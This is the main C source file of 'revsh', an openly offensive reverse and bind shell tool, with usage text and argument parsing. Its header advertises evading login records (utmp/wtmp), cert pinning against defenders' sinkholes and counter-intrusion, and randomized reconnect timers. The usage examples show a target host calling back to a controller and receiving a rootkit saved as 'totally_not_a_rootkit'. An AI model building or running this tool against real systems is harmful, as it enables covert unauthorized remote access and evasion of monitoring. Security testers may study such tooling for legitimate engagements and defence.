
/***********************************************************************************************************************
 *
 * revsh
 *
 * emptymonkey's reverse shell tool with terminal support!
 *	Now with more Perfect Forward Secrecy!!!
 *
 *
 * 2013-07-17: Original release.
 * 2014-08-22: Complete overhaul w/SSL support.
 * 2015-01-16: YACO (Yet another complete overhaul.) Added the internal messaging interface.
 *
 *
 * The revsh binary is intended to be used both on the local control host as well as the remote target host. It is
 * designed to establish a remote shell with terminal support. This isn't intended as a replacement for netcat, but
 * rather as a supplementary tool to ease remote interaction during long engagements.
 *
 *
 * Features:
 *		* Reverse Shell.
 *		* Bind Shell.
 *		* Terminal support.
 *		* UTF-8 support.
 *		* Handle window resize events.
 *		* Circumvent utmp / wtmp. (No login recorded.)
 *		* Process rc file commands upon login.
 *		* OpenSSL encryption with key based authentication baked into the binary.
 *		* Anonymous Diffie-Hellman encryption upon request.
 *		* Ephemeral Diffie-Hellman encryption as default.
 *		* Cert pinning for protection against sinkholes and mitm counter-intrusion.
 *		* Connection timeout for remote process self-termination.
 *		* Randomized retry timers for non-predictable auto-reconnection.
 *		* Non-interactive mode for transfering files.
 *
 **********************************************************************************************************************/



#include "common.h"



char *GLOBAL_calling_card = CALLING_CARD;




/***********************************************************************************************************************
 *
 * usage()
 *
 * Input: None.
 * Output: None.
 *
 * Purpose: Educate the user as to the error of their ways.
 *
 **********************************************************************************************************************/
void usage(){
#ifdef OPENSSL
	fprintf(stderr, "\nusage:\t%s\t[-c [-a] [-d KEYS_DIR] [-f RC_FILE] [-L [LHOST:]LPORT:RHOST:RPORT] [-D [LHOST:]LPORT]\n\t\t[-s SHELL] [-t SEC] [-r SEC1[,SEC2]] [-b] [-n] [-k] [-v] [-h] [ADDRESS:PORT]\n", program_invocation_short_name);
#else /* OPENSSL */
	fprintf(stderr, "\nusage:\t%s\t[-c [-f RC_FILE]] [-s SHELL] [-t SEC] [-r SEC1[,SEC2][-L [LHOST:]LPORT:RHOST:RPORT] [-D [LHOST:]LPORT]]\n\t\t[-b [-k]] [-n] [-v] [ADDRESS:PORT]\n", program_invocation_short_name);
#endif /* OPENSSL */
	fprintf(stderr, "\n\t-c\t\tRun in command and control mode.\t\t(Default is target mode.)\n");
#ifdef OPENSSL
	fprintf(stderr, "\t-a\t\tEnable Anonymous Diffie-Hellman mode.\t\t(Default is \"%s\".)\n", CONTROLLER_CIPHER);
	fprintf(stderr, "\t-d KEYS_DIR\tReference the keys in an alternate directory.\t(Default is \"%s\".)\n", KEYS_DIR);
#endif /* OPENSSL */
	fprintf(stderr, "\t-f RC_FILE\tReference an alternate rc file.\t\t\t(Default is \"%s\".)\n", RC_FILE);
	fprintf(stderr, "\t-L\t\tLocal Forward:\n\t\t\tOpen a listening port locally on LHOST:LPORT.\n\t\t\tForward traffic to RHOST:RPORT.\n"); 
	fprintf(stderr, "\t-D\t\tDynamic Forward:\n\t\t\tOpen a listening port locally on LHOST:LPORT.\n\t\t\tForward traffic to RHOST:RPORT.\n"); 
	fprintf(stderr, "\t-s SHELL\tInvoke SHELL as the remote shell.\t\t(Default is \"%s\".)\n", DEFAULT_SHELL);
	fprintf(stderr, "\t-t SEC\t\tSet the connection timeout to SEC seconds.\t(Default is \"%d\".)\n", TIMEOUT);
	fprintf(stderr, "\t-r SEC1,SEC2\tSet the retry time to be SEC1 seconds, or\t(Default is \"%s\".)\n\t\t\tto be random in the range from SEC1 to SEC2.\n", RETRY);
	fprintf(stderr, "\t-b\t\tStart in bind shell mode.\t\t\t(Default is reverse shell mode.)\n");
	fprintf(stderr, "\t-n\t\tNon-interactive netcat style data broker.\t(Default is interactive w/remote tty.)\n\t\t\tNo tty. Useful for copying files.\n");
	fprintf(stderr, "\t-k\t\tRun in keep-alive mode.\n");
	fprintf(stderr, "\t-v\t\tVerbose output.\n");
	fprintf(stderr, "\t-h\t\tPrint this help.\n");
	fprintf(stderr, "\tADDRESS:PORT\tThe address and port of the listening socket.\t(Default is \"%s\".)\n", ADDRESS);
	fprintf(stderr, "\n\tNotes:\n");
	fprintf(stderr, "\t\t* The -b flag must be invoked on both the control and target hosts to enable bind shell mode.\n");
	fprintf(stderr, "\t\t* Bind shell mode can also be enabled by invoking the binary as 'bindsh' instead of 'revsh'.\n");
	fprintf(stderr, "\t\t* Verbose output may mix with data if -v is used together with -n.\n");
	fprintf(stderr, "\n\tInteractive example:\n");
	fprintf(stderr, "\t\tlocal controller host:\trevsh -c 192.168.0.42:443\n");
	fprintf(stderr, "\t\tremote target host:\trevsh 192.168.0.42:443\n");
	fprintf(stderr, "\n\tNon-interactive example:\n");
	fprintf(stderr, "\t\tlocal controller host:\tcat ~/bin/rootkit | revsh -n -c 192.168.0.42:443\n");
	fprintf(stderr, "\t\tremote target host:\trevsh 192.168.0.42:443 > ./totally_not_a_rootkit\n");
	fprintf(stderr, "\n\n");

	exit(-1);
}



/***********************************************************************************************************************
 *
 * main()
 *
 * Inputs: The usual argument count followed by the argument vector.
 * Outputs: 0 on success. -1 on error.
 *
 * Purpose: main() parses the configuration and calls the appropriate conductor function.
 *
 **********************************************************************************************************************/
int main(int argc, char **argv){

	int retval;
	int opt;
	char *tmp_ptr;

	struct proxy_request_node *tmp_proxy_ptr = NULL;
	struct proxy_request_node *cur_proxy_ptr = NULL;

	struct io_helper *io;
	struct config_helper *config;

	char *retry_string = RETRY;

	unsigned int seed;
	int tmp_fd;


	/*
	 * Basic initialization.
	 */

	/* We will not print errors here, as verbose status has not yet been set. */
	if((io = (struct io_helper *) malloc(sizeof(struct io_helper))) == NULL){
		return(-2);
	}

	if((config = (struct config_helper *) malloc(sizeof(struct config_helper))) == NULL){
		return(-3);
	}


	/* Set defaults. */
	io->local_in_fd = fileno(stdin);
	io->local_out_fd = fileno(stdout);
	io->controller = 0;
	io->eof = 0;
	io->child_sid = 0;
	io->proxy_head = NULL;
	io->proxy_tail = NULL;

	config->interactive = 1;
	config->shell = NULL;
	config->rc_file = RC_FILE;
	config->keys_dir = KEYS_DIR;
	config->bindshell = 0;
	config->keepalive = 0;
	config->timeout = TIMEOUT;

	verbose = 0;

#ifdef OPENSSL
	io->fingerprint_type = NULL;

	config->encryption = EDH;
	config->cipher_list = NULL;
#endif /* OPENSSL */


	/*  Normally I would use the Gnu version. However, this tool needs to be more portable. */
	/*  Keeping the naming scheme, but setting it up myself. */
	if((program_invocation_short_name = strrchr(argv[0], '/'))){
		program_invocation_short_name++;
	}else{
		program_invocation_short_name = argv[0];
	}

	/* Grab the configuration from the command line. */
	while((opt = getopt(argc, argv, "pbkacs:d:f:L:R:D:r:ht:nv")) != -1){
		switch(opt){

			/*  The plaintext case is an undocumented "feature" which should be difficult to use. */
			/*  You will need to pass the -p switch from both ends in order for it to work. */
			/*  This is provided for debugging purposes only. */
#ifdef OPENSSL
			case 'p':
				config->encryption = PLAINTEXT;
				break;

			case 'a':
				config->encryption = ADH;
				break;

			case 'd':
				config->keys_dir = optarg;
				break;
#endif /* OPENSSL */

				/*  bindshell */
			case 'b':
				config->bindshell = 1;
				break;

			case 'k':
				config->keepalive = 1;
				break;

			case 'c':
				io->controller = 1;
				break;

			case 's':
				config->shell = optarg;
				break;

			case 'f':
				config->rc_file = optarg;
				break;

			case 'L':
			case 'D':
				if((tmp_proxy_ptr = calloc(1, sizeof(struct proxy_node))) == NULL){
					return(-4);
				}

				if(!cur_proxy_ptr){
					cur_proxy_ptr = tmp_proxy_ptr;
					config->proxy_request_head = cur_proxy_ptr;
				}else{
					cur_proxy_ptr->next = tmp_proxy_ptr;
					cur_proxy_ptr = tmp_proxy_ptr;
				}
				cur_proxy_ptr->request_string = optarg;

				cur_proxy_ptr->type = PROXY_LOCAL;
				if(opt == 'D'){
					cur_proxy_ptr->type = PROXY_DYNAMIC;
				}
				break;
			
			case 'r':
				retry_string = optarg;
				break;

			case 't':
				errno = 0;
				config->timeout = strtol(optarg, NULL, 10);
				break;

			case 'n':
				config->interactive = 0;
				break;

			case 'v':
				verbose = 1;
				break;

			case 'h':
			default:
				usage();
		}
	}

	/* Check for bindshell mode from name. */
	tmp_ptr = strrchr(argv[0], '/');	
	if(!tmp_ptr){
		tmp_ptr = argv[0];
	}else{
		tmp_ptr++;
	}

	if(!strncmp(tmp_ptr, "bindsh", 6)){
		config->bindshell = 1;
	}

	/* Grab the ip address. */
	if((argc - optind) == 1){
		config->ip_addr = argv[optind];
	}else if((argc - optind) == 0){
		config->ip_addr = ADDRESS;
	}else{
		usage();
	}

	/* Grab some entropy and seed rand(). */
	if((tmp_fd = open("/dev/random", O_RDONLY)) == -1){
    if(verbose){
      fprintf(stderr, "%s: %d: open(\"/dev/random\", O_RDONLY): %s\r\n", \
          program_invocation_short_name, io->controller, \
					strerror(errno));
    }
    return(-1);
	}

	if((retval = read(tmp_fd, &seed, sizeof(seed))) != sizeof(seed)){
    if(verbose){
      fprintf(stderr, "%s: %d: read(%d, %lx, %d): Unable to fill seed!\r\n", \
          program_invocation_short_name, io->controller, \
					tmp_fd, (unsigned long) &seed, (int) sizeof(seed));
    }
    return(-1);
	}

	close(tmp_fd);

	srand(seed);
	

	/*  The joy of a struct with pointers to functions. We only call "io->remote_read()" and the */
	/*  appropriate crypto / no crypto version is called on the backend. */
	io->remote_read = &remote_read_plaintext;
	io->remote_write = &remote_write_plaintext;

#ifdef OPENSSL
	if(config->encryption){
		io->remote_read = &remote_read_encrypted;
		io->remote_write = &remote_write_encrypted;
		io->fingerprint_type = EVP_sha1();

		switch(config->encryption){

			case ADH:
				config->cipher_list = ADH_CIPHER;
				break;

			case EDH:
				config->cipher_list = CONTROLLER_CIPHER;
				break;
		}
	}

	SSL_library_init();
	SSL_load_error_strings();
#endif /* OPENSSL */

	pagesize = sysconf(_SC_PAGESIZE);

	/*  Prepare the retry timer values. */
	errno = 0;
	config->retry_start = strtol(retry_string, &tmp_ptr, 10);
	if(errno){
		if(verbose){
			fprintf(stderr, "%s: %d: strtol(%s, %lx, 10): %s\r\n", \
					program_invocation_short_name, io->controller, retry_string, \
					(unsigned long) &tmp_ptr, strerror(errno));
		}
		return(-1);
	}

	if(*tmp_ptr != '\0'){
		tmp_ptr++;
	}

	errno = 0;
	config->retry_stop = strtol(tmp_ptr, NULL, 10);
	if(errno){
		if(verbose){
			fprintf(stderr, "%s: %d: strtol(%s, NULL, 10): %s\n", \
					program_invocation_short_name, io->controller, \
					tmp_ptr, strerror(errno));
		}
		return(-1);
	}

	/* Call the appropriate conductor. */
	if(io->controller){
		do{
			retval = do_control(io, config);
		} while(retval != -1 && config->keepalive);
	}else{
		retval = do_target(io, config);
	}

	return(retval);
}



/* 
	 The man page for POSIX_OPENPT(3) states that for code that runs on older systems, you can define this yourself
	 easily.
 */
#ifndef FREEBSD
int posix_openpt(int flags){
	return open("/dev/ptmx", flags);
}
#endif /* FREEBSD */
